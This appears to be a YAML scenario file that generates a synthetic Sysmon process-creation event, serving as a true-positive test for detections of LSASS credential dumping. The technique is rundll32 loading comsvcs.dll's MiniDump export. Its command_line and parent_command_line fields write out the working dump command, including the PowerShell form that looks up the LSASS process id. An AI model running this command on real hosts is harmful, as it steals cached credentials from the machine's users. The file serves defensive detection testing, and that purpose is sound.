type: scenario
description: |
  Credential access: LSASS process memory is dumped using only built-in
  Windows binaries. rundll32.exe loads comsvcs.dll and calls its MiniDump
  export against the LSASS process id, writing a full memory dump to disk
  (T1003.001). Sysmon EID 1 (Process Create) captures the rundll32 command
  line carrying both comsvcs.dll and the MiniDump keyword, launched from a
  PowerShell parent. This living-off-the-land path needs no external
  tooling, so it is the true-positive for endpoint process-execution
  detections that flag the rundll32 + comsvcs.dll MiniDump command line.
  See: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
tags: [eid1, comsvcs]
mitre:
  tactics: [credential-access]
  techniques: [T1003.001]

state:
  domain_short:        CORP
  domain_tld:          local
  domain_short_lower:  fn.lower(ref.domain_short)
  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
  computer:            gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
  sysmon_pid:          gen.int(min=1000, max=4000)
  sysmon_tid:          gen.int(min=1000, max=9999)
  process_guid_raw:    gen.uuid()
  process_guid:        "{${ref.process_guid_raw}}"
  process_id:          gen.int(min=1000, max=9999)
  parent_guid_raw:     gen.uuid()
  parent_process_guid: "{${ref.parent_guid_raw}}"
  parent_process_id:   gen.int(min=1000, max=9999)
  logon_guid_raw:      gen.uuid()
  logon_guid:          "{${ref.logon_guid_raw}}"
  logon_id_hex:        gen.hex(len=6)
  logon_id:            "0x${ref.logon_id_hex}"
  event_record_id:     gen.int(min=5000, max=99999)
  username:            gen.username()
  user_domain:         ref.domain_short
  user:                "${ref.user_domain}\\${ref.username}"
  # Target LSASS process id embedded in the rundll32 command line. LSASS is an
  # early-boot system process, so its pid sits in the low range.
  lsass_pid:           gen.int(min=500, max=1200)
  dump_path:           "C:\\Users\\${ref.username}\\AppData\\Local\\Temp\\lsass-comsvcs.dmp"
  image:               C:\Windows\System32\rundll32.exe
  original_file_name:  RUNDLL32.EXE
  # Load-bearing: rundll32 invoking comsvcs.dll's MiniDump export. The command
  # line carries both comsvcs.dll and MiniDump -- the tokens the detection keys on.
  command_line:        "\"C:\\Windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump ${ref.lsass_pid} ${ref.dump_path} full"
  current_directory:   "C:\\Users\\${ref.username}\\AppData\\Local\\Temp\\"
  parent_image:        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  parent_command_line: "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full}"

steps:
  - emit:
      event_type: windows.wineventlog@v1
      fields:
        System:
          Provider:
            "@Name": Microsoft-Windows-Sysmon
            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          EventID: 1
          Version: 5
          Level: 4
          Task: 1
          Opcode: 0
          Keywords: "0x8000000000000000"
          TimeCreated:
            "@SystemTime": gen.timestamp(format=wineventlog)
          EventRecordID: ref.event_record_id
          Correlation: {}
          Execution:
            "@ProcessID": ref.sysmon_pid
            "@ThreadID": ref.sysmon_tid
          Channel: Microsoft-Windows-Sysmon/Operational
          Computer: ref.computer
          Security:
            "@UserID": S-1-5-18
        EventData:
          Data:
            - "@Name": RuleName
              "#text": "-"
            - "@Name": UtcTime
              "#text": gen.timestamp(format=sysmon)
            - "@Name": ProcessGuid
              "#text": ref.process_guid
            - "@Name": ProcessId
              "#text": ref.process_id
            - "@Name": Image
              "#text": ref.image
            - "@Name": FileVersion
              "#text": 10.0.14393.0 (rs1_release.160715-1616)
            - "@Name": Description
              "#text": Windows host process (Rundll32)
            - "@Name": Product
              "#text": "Microsoft® Windows® Operating System"
            - "@Name": Company
              "#text": Microsoft Corporation
            - "@Name": OriginalFileName
              "#text": ref.original_file_name
            - "@Name": CommandLine
              "#text": ref.command_line
            - "@Name": CurrentDirectory
              "#text": ref.current_directory
            - "@Name": User
              "#text": ref.user
            - "@Name": LogonGuid
              "#text": ref.logon_guid
            - "@Name": LogonId
              "#text": ref.logon_id
            - "@Name": TerminalSessionId
              "#text": 0
            - "@Name": IntegrityLevel
              "#text": High
            - "@Name": Hashes
              "#text": "MD5=C7645D43451C6D94D87F4D07BDE59C89,SHA256=495BBA47FC43EE23054FCD419F2F00457162D1C04296900C6AEA551102A810F3,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C"
            - "@Name": ParentProcessGuid
              "#text": ref.parent_process_guid
            - "@Name": ParentProcessId
              "#text": ref.parent_process_id
            - "@Name": ParentImage
              "#text": ref.parent_image
            - "@Name": ParentCommandLine
              "#text": ref.parent_command_line
